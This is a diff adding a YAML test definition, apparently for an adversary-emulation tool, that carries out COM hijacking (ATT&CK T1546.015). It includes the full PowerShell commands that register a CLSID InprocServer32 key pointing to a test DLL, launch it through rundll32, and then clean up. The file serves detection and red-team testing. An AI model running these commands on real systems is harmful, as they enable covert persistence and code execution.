@@ -1,0 +1,28 @@
+---
+- id: 3c8ae3452b200f3509b14463df78068c
+  name: COM Hijacking - InprocServer32
+  description: 'This test uses PowerShell to hijack a reference to a Component Object
+    Model by creating registry values under InprocServer32 key in the HKCU hive then
+    calling the Class ID to be executed via rundll32.exe.
+
+
+    Reference: https://bohops.com/2018/06/28/abusing-com-registry-structure-clsid-localserver32-inprocserver32/'
+  tactic: multiple
+  technique:
+    attack_id: T1546.015
+    name: 'Event Triggered Execution: Component Object Model Hijacking'
+  platforms:
+    windows:
+      psh:
+        command: New-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID\{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}'
+          -Value 'MSAA AccPropServices'; New-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID\{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}\InprocServer32'
+          -Value "PathToAtomicsFolder\..\ExternalPayloads\AtomicTest.dll"; New-ItemProperty
+          -Path 'HKCU:\SOFTWARE\Classes\CLSID\{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}\InprocServer32'
+          -Name 'ThreadingModel' -Value 'Apartment' -PropertyType "String"; Start-Process
+          -FilePath "C:\Windows\System32\RUNDLL32.EXE" -ArgumentList '-sta {B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}'
+        payloads: []
+        cleanup: Remove-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID\{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}'
+          -Recurse -ErrorAction Ignore
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
